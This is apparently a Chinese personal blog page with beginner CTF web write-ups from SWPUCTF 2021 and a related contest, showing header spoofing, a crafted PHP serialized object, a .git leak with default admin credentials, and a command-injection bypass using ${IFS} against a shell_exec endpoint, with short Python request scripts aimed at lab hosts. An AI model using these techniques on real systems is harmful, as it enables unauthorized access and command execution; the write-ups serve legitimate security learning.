        <div class="article-description">
            
            <p>很简单的一题 主要考察header的使用<br>开头让我们用WLLM浏览器访问 肯定就是检测UA<br>然后说让我们在本地访问 header有一个头叫X-Forwarded-For 可以轻松绕过</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 

<span class="hljs-keyword">import</span> json

header = &#123;

  <span class="hljs-string">&#x27;user-agent&#x27;</span>:<span class="hljs-string">&#x27;WLLM&#x27;</span>,

  <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>:<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>

&#125;

url = <span class="hljs-string">f&quot;http://node7.anna.nssctf.cn:23001/&quot;</span>

resp = requests.post(url=url,headers=header)

<span class="hljs-built_in">print</span>(resp.text)</code></pre>



<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/image-20250427165424939.png" alt="image-20250427165424939"></p>

        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/04/27/从0开始的web生涯-SWPUCTF-2021-新生赛-ez-unserialize/" title="从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize">
                    从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-04-27
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>看题目是反序列化的，反序列化应该是有点像python的数组转JSON，因为PHP我记得是运行时语言(?好像是这样叫，有可能加个分号什么的可以执行命令</p>
<p>打开只有一只可爱的胡桃。</p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/image-20250427141203475.png" alt="image-20250427141203475"></p>
<p>直接开扫</p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/image-20250427141223947.png" alt="image-20250427141223947"></p>
<p>flag.php进去空白的 </p>
<p>根据我的百度seo经验 robots.txt一般有货 robots.txt是让搜索引擎爬虫看的</p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/image-20250427141305756.png" alt="image-20250427141305756"></p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/image-20250427141322216.png" alt="image-20250427141322216"></p>
<p>找到题目了</p>
<p>O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p>
<p>因为不是new 一个对象 而是直接反序列化 所以_construct 构造函数不会执行</p>
<p>可以手搓序列化 : O 类名字符数 类名后面的是属性 </p>
<p>得到flag</p>

        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/04/27/从0开始的web生涯-第五空间-2021-WebFTP/" title="从0开始的web生涯 - [第五空间 2021]WebFTP">
                    从0开始的web生涯 - [第五空间 2021]WebFTP
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-04-27
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>目录扫描 信息收集 .git泄露</p>
<p>虽然没怎么接触 盲猜是扫目录 + 扫端口 没怎么接触过kali</p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/image-20250427134740449.png" alt="image-20250427134740449"></p>
<p>扫目录好像是dirsearch 这边装的没找见 更新下源</p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/image-20250427134825901.png" alt="image-20250427134825901"></p>
<p>装上咯</p>
<blockquote>
<p>Dirsearch的使用非常简单，只需要在终端中输入相应的命令即可。以下是一些常用的命令选项：</p>
<p>-u：指定目标URL。<br>-e：指定要扫描的文件扩展名（多个扩展名之间用逗号分隔）。<br>-w：指定自定义的字典文件（用于生成扫描路径）。<br>-o：指定输出格式（支持json、csv、txt等）。<br>-r 递归目录（跑出目录后，继续跑目录下面的目录<br>–random-agents 使用随机UA<br>–threads：设置扫描线程数（默认为10）。<br>例如，要扫描目标URL <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a> 并输出为JSON格式，可以使用以下命令：</p>
</blockquote>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/image-20250427135004070.png" alt="image-20250427135004070"></p>
<p>就放在相对目录下的.git 既然提示了git泄露 </p>
<blockquote>
<p>通过访问&#x2F;.git&#x2F;config文件可以正常的访问，config的配置信息中，我们可以看到以下的内容：</p>
<ul>
<li>版本控制系统信息: repositoryformatversion &#x3D; 0，表明这是 Git 版本 1 的配置。</li>
<li>仓库类型: bare &#x3D; false，表明这是工作目录，并非裸仓库。</li>
<li>分支信息: 包含 master 和 localize 两个分支的信息。</li>
<li>远程仓库地址: url &#x3D; XXXXXXXX:XXXXXXXX&#x2F;radiodetali.git，攻击者通过这个信息可以获取到远程仓库的地址，甚至通过其他漏洞进一步入侵远程仓库。</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://node7.anna.nssctf.cn:28653/.git/config">http://node7.anna.nssctf.cn:28653/.git/config</a></p>
<pre><code class="hljs git">[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote &quot;origin&quot;]
	url = https://github.com/wifeat/WebFTP.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch &quot;master&quot;]
	remote = origin
	merge = refs/heads/master</code></pre>

<p>去github找readme发现默认账号密码</p>
<blockquote>
<p>使用说明 1、初始账号 超级管理员 admin 密码 admin888</p>
</blockquote>
<p>找老半天找到flag 在phpinfo的environment里面 真傻逼</p>
<p>还可以通过.git 找到<img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/image-20250427140558753.png" alt="image-20250427140558753"></p>
<p>打开是admin 的 密码 md5</p>
<p><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/image-20250427140627384.png" alt="image-20250427140627384"></p>

        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/04/27/从0开始的web生涯-SWPUCTF-2021-新生赛-babyrce/" title="从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce">
                    从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-04-27
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]==<span class="hljs-number">1</span>) &#123;
	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../next.php&quot;</span>;
&#125; <span class="hljs-keyword">else</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小饼干最好吃啦！&quot;</span>;
<span class="hljs-meta">?&gt;</span> 小饼干最好吃啦！</code></pre>

<p>直接传递cookies admin 为1 就可以</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 

url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:29857/&quot;</span>

cookies = &#123;

  <span class="hljs-string">&#x27;admin&#x27;</span>: <span class="hljs-string">&quot;1&quot;</span>

&#125;

resp = requests.post(url=url,cookies=<span class="hljs-number">1</span>)

<span class="hljs-built_in">print</span>(resp.text)

</code></pre>

<p>得到rasalghul.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;
	<span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>)) &#123;
		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);
	&#125;
	<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$ip</span>);
	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>正则过滤空格 ${IFS}可绕过 ${IFS} - Linux 下的空白字符 </p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 

param = <span class="hljs-string">&quot;ls$&#123;IFS&#125;/&quot;</span>

url = <span class="hljs-string">f&quot;http://node5.anna.nssctf.cn:29857/rasalghul.php?url=<span class="hljs-subst">&#123;param&#125;</span>&quot;</span>

resp = requests.get(url=url)

<span class="hljs-built_in">print</span>(resp.text)</code></pre>

<p>flag为flllllaaaaaaggggggg</p>
<blockquote>
<p>boot<br>dev<br>etc<br>flllllaaaaaaggggggg<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var</p>
</blockquote>
<p>结束</p>

        </div>
        
            
        
        
    </div>
</article>

        
        <ul class="pagination clear">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="extend next" rel="next" href="/page/2/">下一页</a>
</ul>
    </section>
    
<section class="tool-area">

    <div class="toolbar">
        

        
        <div class="widget-post widget" style="order: 1 ">
            <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/">windows 虚拟内存笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li></ul>
        </div>
        

        
        <div class="widget-tags widget" style="order: 2 ">
            <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
        </div>
        

        
        <div class="widget-categories widget" style="order: 3 ">
            <h2 class="widget-title"><i class="fa fa-folder-open"></i> 分类</h2>
            
        </div>
        

    </div>
</section>

</div>




    
        <footer class="footer">
	<p class="footer-intro">
		
		@2025 My Blog.
	</p>
	<p class="footer-intro">
			Powered By <a href="https://hexo.io/zh-cn/" target="_blank">hexo</a>
			theme <a href="https://github.com/iengu/hexo-theme-mokusei" target="_blank">mokusei</a> by <a href="https://www.iengu.com" target="blank">iengu</a>
	</p>
</footer>




        <div class="extend-tools" id="extend-tools" style="display: none;">
    <ul>
        <li class="tools-returnTop" title="返回顶部"><i class="fa fa-angle-double-up"></i></li>
    </ul>
</div>

	</div>

	
<script src="/js/org/jquery.min.js"></script>

    
<script src="/js/extend.js"></script>

</body>
</html>